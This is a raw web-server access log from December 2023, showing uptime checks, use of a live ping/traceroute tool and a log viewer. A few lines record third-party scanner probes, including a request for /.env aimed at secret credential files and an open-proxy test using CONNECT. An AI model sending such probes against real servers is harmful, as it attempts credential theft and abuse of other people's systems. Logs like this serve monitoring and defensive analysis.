167.71.120.76 - - [18/Dec/2023:03:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3451 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:03:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3452 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:03:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3453 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3454 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3455 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3456 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:03:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3457 "www@docker" "http://172.18.0.9:80" 1ms
117.235.107.159 - - [18/Dec/2023:03:23:07 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3458 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:03:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3459 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:03:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3460 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3461 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3462 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3463 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3464 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [18/Dec/2023:03:25:44 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3465 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:03:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3466 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3467 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3468 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3469 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:03:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3470 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3471 "www@docker" "http://172.18.0.9:80" 1ms
104.131.144.30 - - [18/Dec/2023:03:29:18 +0000] "GET /version HTTP/1.1" 404 19 "-" "-" 3472 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:03:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3473 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3474 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3475 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3476 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:03:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3477 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:03:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3478 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3479 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:03:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3480 "www@docker" "http://172.18.0.9:80" 0ms
172.104.210.105 - - [18/Dec/2023:03:33:00 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3481 "-" "-" 0ms
45.79.181.104 - - [18/Dec/2023:03:33:14 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3482 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:03:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3483 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3484 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:03:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3485 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3486 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3487 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3488 "www@docker" "http://172.18.0.9:80" 0ms
89.187.178.158 - - [18/Dec/2023:03:35:39 +0000] "GET /trace/startping.php?id=akfqibq2o HTTP/2.0" 200 105 "-" "-" 3489 "livetrace@docker" "http://172.18.0.3:80" 12ms
89.187.178.158 - - [18/Dec/2023:03:35:39 +0000] "GET /trace/starttrace.php?id=cg3li8vv2 HTTP/2.0" 200 106 "-" "-" 3490 "livetrace@docker" "http://172.18.0.3:80" 12ms
89.187.178.158 - - [18/Dec/2023:03:35:41 +0000] "GET /trace/pollping.php?id=akfqibq2o HTTP/2.0" 200 30 "-" "-" 3491 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:35:41 +0000] "GET /trace/polltrace.php?id=cg3li8vv2 HTTP/2.0" 200 335 "-" "-" 3492 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:35:42 +0000] "GET /trace/pollping.php?id=akfqibq2o HTTP/2.0" 200 54 "-" "-" 3493 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:35:42 +0000] "GET /trace/polltrace.php?id=cg3li8vv2 HTTP/2.0" 200 335 "-" "-" 3494 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:35:43 +0000] "GET /trace/pollping.php?id=akfqibq2o HTTP/2.0" 200 78 "-" "-" 3495 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:35:43 +0000] "GET /trace/polltrace.php?id=cg3li8vv2 HTTP/2.0" 200 335 "-" "-" 3496 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:35:44 +0000] "GET /trace/polltrace.php?id=cg3li8vv2 HTTP/2.0" 200 365 "-" "-" 3498 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:35:44 +0000] "GET /trace/pollping.php?id=akfqibq2o HTTP/2.0" 200 101 "-" "-" 3497 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:35:45 +0000] "GET /trace/pollping.php?id=akfqibq2o HTTP/2.0" 200 125 "-" "-" 3499 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:35:45 +0000] "GET /trace/polltrace.php?id=cg3li8vv2 HTTP/2.0" 200 365 "-" "-" 3500 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:35:46 +0000] "GET /trace/pollping.php?id=akfqibq2o HTTP/2.0" 200 148 "-" "-" 3501 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:35:46 +0000] "GET /trace/polltrace.php?id=cg3li8vv2 HTTP/2.0" 200 365 "-" "-" 3502 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:35:47 +0000] "GET /trace/pollping.php?id=akfqibq2o HTTP/2.0" 200 171 "-" "-" 3503 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:35:47 +0000] "GET /trace/polltrace.php?id=cg3li8vv2 HTTP/2.0" 200 367 "-" "-" 3504 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:35:48 +0000] "GET /trace/pollping.php?id=akfqibq2o HTTP/2.0" 200 191 "-" "-" 3505 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:35:48 +0000] "GET /trace/polltrace.php?id=cg3li8vv2 HTTP/2.0" 200 367 "-" "-" 3506 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:35:48 +0000] "GET /trace/cleanping.php?id=akfqibq2o HTTP/2.0" 200 71 "-" "-" 3507 "livetrace@docker" "http://172.18.0.3:80" 3ms
89.187.178.158 - - [18/Dec/2023:03:35:49 +0000] "GET /trace/polltrace.php?id=cg3li8vv2 HTTP/2.0" 200 367 "-" "-" 3508 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:35:50 +0000] "GET /trace/polltrace.php?id=cg3li8vv2 HTTP/2.0" 200 831 "-" "-" 3509 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:35:50 +0000] "GET /trace/cleantrace.php?id=cg3li8vv2 HTTP/2.0" 200 72 "-" "-" 3510 "livetrace@docker" "http://172.18.0.3:80" 2ms
178.62.6.231 - - [18/Dec/2023:03:35:52 +0000] "GET /?v=1&ip=138.197.61.16&port=80 HTTP/1.1" 301 17 "-" "-" 3511 "web-to-websecure@internal" "-" 0ms
178.62.6.231 - - [18/Dec/2023:03:35:52 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 3512 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:03:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3513 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3514 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3515 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3516 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3517 "www@docker" "http://172.18.0.9:80" 31ms
167.71.120.76 - - [18/Dec/2023:03:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3518 "www@docker" "http://172.18.0.9:80" 17ms
89.187.178.158 - - [18/Dec/2023:03:39:20 +0000] "GET /trace/ HTTP/2.0" 200 6047 "-" "-" 3519 "livetrace@docker" "http://172.18.0.3:80" 23ms
89.187.178.158 - - [18/Dec/2023:03:39:20 +0000] "GET /trace/styles.css?version=11 HTTP/2.0" 200 1367 "-" "-" 3520 "livetrace@docker" "http://172.18.0.3:80" 1ms
159.203.109.206 - - [18/Dec/2023:03:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3521 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:03:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3522 "www@docker" "http://172.18.0.9:80" 0ms
89.187.178.158 - - [18/Dec/2023:03:39:56 +0000] "GET /trace/startping.php?id=0rjerrk7i HTTP/2.0" 200 105 "-" "-" 3523 "livetrace@docker" "http://172.18.0.3:80" 3ms
89.187.178.158 - - [18/Dec/2023:03:39:56 +0000] "GET /trace/starttrace.php?id=dgvkwz9aw HTTP/2.0" 200 106 "-" "-" 3524 "livetrace@docker" "http://172.18.0.3:80" 5ms
89.187.178.158 - - [18/Dec/2023:03:39:57 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3525 "livetrace@docker" "http://172.18.0.3:80" 3ms
89.187.178.158 - - [18/Dec/2023:03:39:57 +0000] "GET /trace/polltrace.php?id=dgvkwz9aw HTTP/2.0" 200 899 "-" "-" 3526 "livetrace@docker" "http://172.18.0.3:80" 3ms
89.187.178.158 - - [18/Dec/2023:03:39:57 +0000] "GET /trace/cleantrace.php?id=dgvkwz9aw HTTP/2.0" 200 72 "-" "-" 3527 "livetrace@docker" "http://172.18.0.3:80" 3ms
89.187.178.158 - - [18/Dec/2023:03:39:58 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 55 "-" "-" 3528 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:39:59 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 79 "-" "-" 3529 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:00 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3530 "livetrace@docker" "http://172.18.0.3:80" 1028ms
89.187.178.158 - - [18/Dec/2023:03:40:01 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 404 16 "-" "-" 3531 "www@docker" "http://172.18.0.9:80" 98ms
89.187.178.158 - - [18/Dec/2023:03:40:02 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 404 16 "-" "-" 3532 "www@docker" "http://172.18.0.9:80" 60ms
89.187.178.158 - - [18/Dec/2023:03:40:03 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3533 "livetrace@docker" "http://172.18.0.3:80" 14ms
89.187.178.158 - - [18/Dec/2023:03:40:04 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3534 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:05 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3535 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:40:06 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3536 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:07 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3537 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:08 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3538 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:09 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3539 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:10 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3540 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:11 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3541 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:12 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3542 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:40:13 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3543 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:14 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3544 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:15 +0000] "GET /trace/pollping.php?id=0rjerrk7i HTTP/2.0" 200 31 "-" "-" 3545 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:40:15 +0000] "GET /trace/ HTTP/2.0" 200 6047 "-" "-" 3546 "livetrace@docker" "http://172.18.0.3:80" 3ms
89.187.178.158 - - [18/Dec/2023:03:40:15 +0000] "GET /trace/styles.css?version=11 HTTP/2.0" 304 0 "-" "-" 3547 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:40:17 +0000] "GET /trace/starttrace.php?id=i865f7e7b HTTP/2.0" 200 106 "-" "-" 3548 "livetrace@docker" "http://172.18.0.3:80" 4ms
89.187.178.158 - - [18/Dec/2023:03:40:18 +0000] "GET /trace/polltrace.php?id=i865f7e7b HTTP/2.0" 200 255 "-" "-" 3549 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:40:19 +0000] "GET /trace/polltrace.php?id=i865f7e7b HTTP/2.0" 200 255 "-" "-" 3550 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:40:20 +0000] "GET /trace/polltrace.php?id=i865f7e7b HTTP/2.0" 200 255 "-" "-" 3551 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:40:21 +0000] "GET /trace/polltrace.php?id=i865f7e7b HTTP/2.0" 200 668 "-" "-" 3552 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:40:21 +0000] "GET /trace/cleantrace.php?id=i865f7e7b HTTP/2.0" 200 72 "-" "-" 3553 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [18/Dec/2023:03:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3554 "www@docker" "http://172.18.0.9:80" 14ms
89.187.178.158 - - [18/Dec/2023:03:40:30 +0000] "GET /trace/startping.php?id=huq0vai53 HTTP/2.0" 200 105 "-" "-" 3555 "livetrace@docker" "http://172.18.0.3:80" 7ms
89.187.178.158 - - [18/Dec/2023:03:40:30 +0000] "GET /trace/starttrace.php?id=l08a332ud HTTP/2.0" 200 106 "-" "-" 3556 "livetrace@docker" "http://172.18.0.3:80" 5ms
89.187.178.158 - - [18/Dec/2023:03:40:31 +0000] "GET /trace/pollping.php?id=huq0vai53 HTTP/2.0" 200 31 "-" "-" 3557 "livetrace@docker" "http://172.18.0.3:80" 5ms
89.187.178.158 - - [18/Dec/2023:03:40:31 +0000] "GET /trace/polltrace.php?id=l08a332ud HTTP/2.0" 200 720 "-" "-" 3558 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:31 +0000] "GET /trace/cleantrace.php?id=l08a332ud HTTP/2.0" 200 72 "-" "-" 3559 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:32 +0000] "GET /trace/pollping.php?id=huq0vai53 HTTP/2.0" 200 55 "-" "-" 3560 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:33 +0000] "GET /trace/pollping.php?id=huq0vai53 HTTP/2.0" 200 77 "-" "-" 3561 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:40:34 +0000] "GET /trace/pollping.php?id=huq0vai53 HTTP/2.0" 200 101 "-" "-" 3562 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:35 +0000] "GET /trace/pollping.php?id=huq0vai53 HTTP/2.0" 200 125 "-" "-" 3563 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:40:36 +0000] "GET /trace/pollping.php?id=huq0vai53 HTTP/2.0" 200 149 "-" "-" 3564 "livetrace@docker" "http://172.18.0.3:80" 1ms
167.71.120.76 - - [18/Dec/2023:03:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3565 "www@docker" "http://172.18.0.9:80" 33ms
89.187.178.158 - - [18/Dec/2023:03:40:37 +0000] "GET /trace/pollping.php?id=huq0vai53 HTTP/2.0" 200 173 "-" "-" 3566 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:40:38 +0000] "GET /trace/pollping.php?id=huq0vai53 HTTP/2.0" 200 194 "-" "-" 3567 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:40:38 +0000] "GET /trace/cleanping.php?id=huq0vai53 HTTP/2.0" 200 71 "-" "-" 3568 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:40:42 +0000] "GET /trace/ HTTP/2.0" 200 6047 "-" "-" 3569 "livetrace@docker" "http://172.18.0.3:80" 3ms
162.216.149.151 - - [18/Dec/2023:03:40:56 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3570 "web-to-websecure@internal" "-" 0ms
162.216.149.151 - - [18/Dec/2023:03:40:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3571 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:03:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3572 "www@docker" "http://172.18.0.9:80" 0ms
89.187.178.158 - - [18/Dec/2023:03:41:32 +0000] "GET /trace/startping.php?id=unza2vjhm HTTP/2.0" 200 105 "-" "-" 3573 "livetrace@docker" "http://172.18.0.3:80" 5ms
89.187.178.158 - - [18/Dec/2023:03:41:32 +0000] "GET /trace/starttrace.php?id=m2b6lsbcj HTTP/2.0" 200 106 "-" "-" 3574 "livetrace@docker" "http://172.18.0.3:80" 3ms
89.187.178.158 - - [18/Dec/2023:03:41:33 +0000] "GET /trace/pollping.php?id=unza2vjhm HTTP/2.0" 200 31 "-" "-" 3575 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:41:33 +0000] "GET /trace/polltrace.php?id=m2b6lsbcj HTTP/2.0" 200 719 "-" "-" 3576 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:41:33 +0000] "GET /trace/cleantrace.php?id=m2b6lsbcj HTTP/2.0" 200 72 "-" "-" 3577 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:41:34 +0000] "GET /trace/pollping.php?id=unza2vjhm HTTP/2.0" 200 55 "-" "-" 3578 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:41:35 +0000] "GET /trace/pollping.php?id=unza2vjhm HTTP/2.0" 200 79 "-" "-" 3579 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:41:36 +0000] "GET /trace/pollping.php?id=unza2vjhm HTTP/2.0" 200 103 "-" "-" 3580 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:41:37 +0000] "GET /trace/pollping.php?id=unza2vjhm HTTP/2.0" 200 127 "-" "-" 3581 "livetrace@docker" "http://172.18.0.3:80" 1ms
167.71.120.76 - - [18/Dec/2023:03:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3582 "www@docker" "http://172.18.0.9:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:41:38 +0000] "GET /trace/pollping.php?id=unza2vjhm HTTP/2.0" 200 150 "-" "-" 3583 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:41:39 +0000] "GET /trace/pollping.php?id=unza2vjhm HTTP/2.0" 200 174 "-" "-" 3584 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:41:40 +0000] "GET /trace/pollping.php?id=unza2vjhm HTTP/2.0" 200 195 "-" "-" 3585 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:41:40 +0000] "GET /trace/cleanping.php?id=unza2vjhm HTTP/2.0" 200 71 "-" "-" 3586 "livetrace@docker" "http://172.18.0.3:80" 3ms
89.187.178.158 - - [18/Dec/2023:03:42:11 +0000] "GET /trace/styles.css?version=11 HTTP/2.0" 304 0 "-" "-" 3587 "livetrace@docker" "http://172.18.0.3:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3588 "www@docker" "http://172.18.0.9:80" 1ms
57.129.23.166 - - [18/Dec/2023:03:42:23 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3589 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [18/Dec/2023:03:42:24 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3590 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:03:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3591 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:03:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3592 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3593 "www@docker" "http://172.18.0.9:80" 0ms
89.187.178.158 - - [18/Dec/2023:03:43:58 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3594 "www@docker" "http://172.18.0.9:80" 29ms
89.187.178.158 - - [18/Dec/2023:03:43:59 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 200 1642 "-" "-" 3595 "www@docker" "http://172.18.0.9:80" 0ms
89.187.178.158 - - [18/Dec/2023:03:43:59 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2699 "-" "-" 3596 "www@docker" "http://172.18.0.9:80" 27ms
159.203.109.206 - - [18/Dec/2023:03:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3597 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3598 "www@docker" "http://172.18.0.9:80" 0ms
89.187.178.158 - - [18/Dec/2023:03:44:49 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2642 "-" "-" 3599 "www@docker" "http://172.18.0.9:80" 16ms
89.187.178.158 - - [18/Dec/2023:03:44:59 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2628 "-" "-" 3600 "www@docker" "http://172.18.0.9:80" 27ms
89.187.178.158 - - [18/Dec/2023:03:45:09 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2614 "-" "-" 3601 "www@docker" "http://172.18.0.9:80" 18ms
89.187.178.158 - - [18/Dec/2023:03:45:19 +0000] "GET /trace/ HTTP/2.0" 200 6047 "-" "-" 3602 "livetrace@docker" "http://172.18.0.3:80" 4ms
89.187.178.158 - - [18/Dec/2023:03:45:19 +0000] "GET /trace/styles.css?version=11 HTTP/2.0" 304 0 "-" "-" 3603 "livetrace@docker" "http://172.18.0.3:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3604 "www@docker" "http://172.18.0.9:80" 0ms
89.187.178.158 - - [18/Dec/2023:03:45:31 +0000] "GET /trace/startping.php?id=kz4oq21jy HTTP/2.0" 200 105 "-" "-" 3605 "livetrace@docker" "http://172.18.0.3:80" 5ms
89.187.178.158 - - [18/Dec/2023:03:45:31 +0000] "GET /trace/starttrace.php?id=mwwq29rh8 HTTP/2.0" 200 106 "-" "-" 3606 "livetrace@docker" "http://172.18.0.3:80" 4ms
89.187.178.158 - - [18/Dec/2023:03:45:32 +0000] "GET /trace/polltrace.php?id=mwwq29rh8 HTTP/2.0" 200 253 "-" "-" 3608 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:45:32 +0000] "GET /trace/pollping.php?id=kz4oq21jy HTTP/2.0" 200 30 "-" "-" 3607 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:45:33 +0000] "GET /trace/pollping.php?id=kz4oq21jy HTTP/2.0" 200 54 "-" "-" 3609 "livetrace@docker" "http://172.18.0.3:80" 1ms
